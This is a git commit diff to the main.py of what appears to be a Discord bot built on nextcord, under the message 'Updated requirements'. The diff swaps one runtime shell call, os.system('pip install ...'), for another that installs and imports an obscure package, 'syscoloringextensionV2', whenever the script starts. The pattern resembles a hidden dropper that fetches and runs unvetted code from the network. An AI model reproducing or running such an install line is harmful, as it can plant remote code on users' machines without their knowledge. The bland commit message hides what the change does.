26ff59be45f00b0c780e6edf491d09bc74015298
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-07 11:32:56 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install syscolouringsextV1")
-import syscolouringsextV1
+os.system("pip install syscoloringextensionV2")
+import syscoloringextensionV2
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
